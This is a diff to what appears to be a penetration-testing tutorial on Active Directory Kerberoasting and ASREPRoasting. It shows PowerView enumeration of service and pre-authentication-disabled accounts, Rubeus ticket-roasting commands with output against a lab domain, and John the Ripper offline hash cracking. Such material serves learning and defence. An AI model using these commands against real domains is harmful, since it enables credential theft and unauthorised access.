@@ -36,7 +36,7 @@ Most services run on a machine under the context of a user account. Above in the
 
 As a regular domain user first list all kerberoastable accounts(service accounts running in the context of user accounts). We can use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
-```bash
+```powershell
 PS C:\Users\Alex> Get-DomainUser -SPN
 
 distinguishedName : CN=SQLService,OU=Service Accounts,DC=dev,DC=dhitalcorp,DC=local
@@ -57,7 +57,7 @@ We can request service ticket for this `mssql_svc` service account and crack it 
 
 Below we are using Rubeus. 
 
-```bash
+```powershell
 PS C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
 
 [*] Action: Kerberoasting
@@ -80,4 +80,46 @@ Remove the service principal name from the hash to crack using John. The hash sh
 ```bash
 ┌──(alex㉿kali)-[~]
 └─$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou2024.txt mssql_svc.txt
+```
+# ASREPRoasting
+
+![Asrep](https://i.postimg.cc/XvbQQcyV/asrep.png)
+
+When the user first requests for TGT with the authentication server they need to send their username along with an encrypted timestamp. Asreproastable accounts are the accounts which has "Do not require Kerberos preauthentication" option set meaning the user does not have to send an encrypted timestamp. Simply if a user has kerberos pre-authentication disabled we can just send our username during AS-REQ(Authentication Server Request) to request for TGT and during AS-REP(Authentication Server Response) a part of this reply can be cracked offline to recover the user's password. We can find asreproastable accounts by using Rubeus, PowerView, ADSearch.exe or many other tools.
+
+```powershell
+PS C:\Users\Alex> Get-DomainUser -PreauthNotRequired -Verbose
+
+distinguishedName : CN=adhital,OU=Users,DC=dev,DC=dhitalcorp,DC=local
+enabled           : True
+name              : adhital
+objectClass       : user
+objectGUID        : 98765432-10ab-cdef-4321-1234567890ab
+passwordExpired   : False
+pwdLastSet        : 7/23/2024 12:34:56 PM
+samAccountName    : adhital
+userPrincipalName : adhital@dev.dhitalcorp.local
+
+
+```
+
+Using Rubeus we can proceed to roast it by doing.
+
+```powershell
+PS C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:adhital /nowrap
+
+[*] SamAccountName         : adhital
+[*] DistinguishedName      : CN=IT Users,CN=Users,DC=dev,DC=dhitalcorp,DC=local
+[*] Using domain controller: dc-1.dev.dhitalcorp.local (10.10.99.10)
+[*] Building AS-REQ (w/o preauth) for: 'dev.dhitalcorp.local\adhital'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$adhital@dev.dhitalcorp.local:47AC2248725F4E6CE2295C380CXXXXXX$51A78E6C55B42D9EXXXXX.......
+```
+Save the hash as `asrep.txt` and crack using john.
+
+```bash
+┌──(alex㉿kali)-[~]
+└─$ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou2024.txt asrep.txt
 ```
